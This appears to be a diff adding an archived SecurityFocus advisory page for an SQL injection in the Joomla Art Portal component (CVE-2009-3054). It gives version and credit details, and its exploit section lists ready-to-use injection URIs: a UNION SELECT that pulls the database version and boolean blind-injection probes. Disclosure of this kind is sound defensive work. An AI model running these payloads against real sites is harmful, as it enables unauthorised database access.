@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid36206<p><b><span style="font-size: 18pt;">Joomla! Art Portal Component 'portalid' Parameter SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/36206/info">info</a><br><a href="http://www.securityfocus.com/bid/36206/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/36206/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/36206/solution">solution</a><br><a href="http://www.securityfocus.com/bid/36206/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				36206
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-3054<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 01 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:07PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				599eme Man
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Artetics.com Art Portal  1.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Artetics.com Art Portal 1.0.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit this issue.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/index.php?option=com_artportal&amp;amp;portalid=1 union all select 1,2,3,4,5,6,version(),8,9--<br/>http://www.example.com/index.php?option=com_artportal&amp;amp;portalid=1 and 1=2 =&amp;gt; False<br/>http://www.example.com/index.php?option=com_artportal&amp;amp;portalid=1 and and 1=1 =&amp;gt; True<br/>http://www.example.com/index.php?option=com_artportal&amp;amp;portalid=1 and substring(@@version,1,1)=4 =&amp;gt; False<br/>http://www.example.com/index.php?option=com_artportal&amp;amp;portalid=1 and substring(@@version,1,1)=5 =&amp;gt; True
+	
+		<ul>
+</ul>
+</div>
